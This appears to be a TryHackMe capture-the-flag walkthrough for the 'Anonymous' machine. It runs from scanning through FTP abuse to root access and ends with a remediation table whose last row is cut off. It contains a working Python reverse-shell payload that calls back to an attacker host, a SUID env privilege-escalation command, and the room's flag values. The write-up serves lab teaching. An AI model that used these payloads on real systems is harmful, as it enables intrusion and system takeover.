# Walkthrough: TryHackMe - Anonymous CTF
## Reconnaissance, Enumeration & Initial Access Vector
### Executive Summary
An offensive security assessment was conducted against the target machine ```10.49.158.183``` (Anonymous).

Initial reconnaissance revealed open FTP, SSH, and SMB services. Anonymous FTP access allowed write permissions to a world-writable directory containing a maintenance shell script (```clean.sh```). Analysis of log outputs indicated that ```clean.sh``` is periodically executed via an automated task (cron job). Modifying this script serves as the initial access vector to achieve a reverse shell.

---

## Network Reconnaissance
### 1. Host Discovery & Nmap Port Scan
An aggressive Nmap service scan was performed across all TCP ports to identify running services and system OS details:
```bash
nmap -sV -sC -p- 10.49.158.183
```
Nmap Scan Output:
```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Key Discoveries:
- FTP (Port 21): ```vsftpd 2.0.8+``` allowing anonymous login.
- SSH (Port 22): OpenSSH 7.6p1 running on Ubuntu.
- SMB (Ports 139/445): Samba 4.7.6-Ubuntu sharing network resources.

---

## Service Enumeration
### 2. SMB Share Enumeration
SMB enumeration was conducted using ```smbmap``` to check for unauthenticated guest share access:
```bash
smbmap -H 10.49.158.183
```
Output:
```bash
[+] IP: 10.49.158.183:445        Name: 10.49.158.183      Status: NULL Session
    Disk                            Permissions     Comment
    ----                            -----------     -------
    print$                          NO ACCESS       Printer Drivers
    pics                            READ ONLY       My SMB Share Directory for Pics
    IPC$                            NO ACCESS       IPC Service (anonymous server)
```
- Result: The ```pics``` share allows read-only access, but contains no direct exploitation vectors.

### 3. Anonymous FTP Access & File Retrieval
Connecting to the FTP service with username ```anonymous``` (blank password) granted access to a directory structure housing scripts:
```bash
ftp 10.49.158.183
# Username: anonymous
# Password: [Press Enter]
```
FTP Directory Listing (```/scripts```):
```bash
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
-rwxr-xr-x    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-r--r--    1 1000     1000         1075 Aug 14 04:33 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```
Files downloaded to the local working directory via ```mget *```:
- ```to_do.txt``` — Notes referencing disabling anonymous login.
- ```removed_files.log``` — Standard execution logs updated continuously.
- ```clean.sh``` — Bash cleanup script executed regularly.

---

## Vulnerability Analysis & Exploit Preparation
### 4. Cron Job Analysis
Inspection of ```clean.sh``` revealed its intended functionality:
```bash
cat clean.sh
```
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
        for LINE in $tmp_files; do
                rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
- Vulnerability: The ```/scripts``` directory on FTP is world-writable (```drwxrwxrwx```), and the timestamps inside ```removed_files.log``` confirm that ```clean.sh``` is triggered automatically by a scheduled ```cron``` job every minute under high privileges.

### 5. Weaponizing clean.sh
To achieve execution on the target, ```clean.sh``` was modified locally to overwrite the existing script on the FTP server with a standard Python reverse shell payload targeting port ```443```:

Local Payload (```clean.sh```):
```bash
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.130",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
Next Steps for Execution:
1. Setup Netcat listener on your Kali machine:
```bash
nc -lvnp 443
```
2. Re-connect to FTP and upload the weaponized ```clean.sh```:
```bash
ftp 10.49.158.183
cd scripts
put clean.sh
```
3. Wait up to 1 minute for the scheduled task to execute and trigger the reverse shell!

---

## Exploitation, Privilege Escalation & Remediation
## Initial Access & User Flag Retrieval
### 6. Cron Job Execution & Reverse Shell
With the Netcat listener active on port ```443``` on the attacker host (```192.168.135.130```) and the weaponized ```clean.sh``` script uploaded to ```/scripts/clean.sh``` via FTP, the scheduled cron task executed automatically within one minute:
```bash
nc -lvnp 443
```
Connection Output:
```bash
listening on [any] 443 ...
connect to [192.168.135.130] from (UNKNOWN) [10.49.158.183] 46038
namelessone@anonymous:~$
```
- Initial Access Granted: Low-privilege shell obtained as user ```namelessone```.

### 7. User Flag Extraction
Navigating to the user's home directory revealed the first objective flag:
```bash
cd /home/namelessone
cat user.txt
```
User Flag:
```bash
90d6f992585815ff991e68748c414740
```

---

## Local Enumeration & SUID Abuse
### 8. SUID Binary Search
To identify misconfigurations for privilege escalation, a system-wide search was conducted for binaries possessing the Set owner User ID (```SUID```) permission bit set:
```bash
find / -perm -u=s -type f 2>/dev/null
```
Notable Discovery:
```bash
/snap/core/9066/bin/su
/bin/mount
/usr/bin/passwd
/usr/bin/env
/usr/bin/sudo
/usr/bin/pkexec
```
- Vulnerability: The binary ```/usr/bin/env``` has its SUID bit enabled (```-rwsr-xr-x```), owned by ```root```. Standard users should not have SUID access to environment binaries, as they allow running sub-shells while preserving elevated effective user privileges.

---

## Privilege Escalation & Root Flag Extraction
### 9. Root Privilege Escalation
Executing ```/usr/bin/env``` with ```/bin/sh -p``` instructs the program to spawn a shell while preserving elevated effective UID (```eUID=0```):
```bash
/usr/bin/env /bin/sh -p
```
Privilege Verification:
```bash
# whoami
root
```
### 10. Root Flag Retrieval
Navigating to the ```/root``` directory yields the final system flag:
```bash
# cd /root
# ls
root.txt
# cat root.txt
```
Root Flag:
```bash
4d930091c31a622a7ed10f27999af363
```

---

## Remediation & Defensive Best Practices
To secure the host against similar vectors, implement the following hardening measures:
| Issue / Vulnerability	          | Remediation Action                                                                                                                 |
| :--                             | :--                                                                                                                                |
| Anonymous FTP Access	          | Disable anonymous FTP logins in /etc/vsftpd.conf by setting anonymous_enable=NO.                                                   |
| World-Writable FTP Directory	  | Restrict directory permissions for uploaded files using chmod and ensure web/FTP users cannot overwrite system-executed scripts.   |
| SUID Bit Misconfiguration	      | Remove the SUID bit from non-essential system binaries: chmod u-s /usr/bin/env.                                                    | 
| Insecure Scheduled Tasks	      | Avoid running cron scripts stored in world-writable directories. Restrict script ownership to root with chown root:root and strict |            
